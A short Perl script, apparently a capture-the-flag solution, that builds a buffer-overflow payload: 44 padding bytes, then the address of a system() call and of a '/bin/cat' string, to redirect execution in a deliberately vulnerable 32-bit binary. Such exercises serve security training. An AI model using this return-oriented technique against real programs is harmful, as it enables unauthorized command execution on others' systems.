$PADDING="B"x44;
$SYSTEM="\x57\x86\x04\x08"; # addr of the call to system() in 'usefulFunction'
$BINCAT="\x30\xa0\x04\x08"; # addr of "/bin/cat ..." to push on the stack as arg to system()

print $PADDING . $SYSTEM . $BINCAT
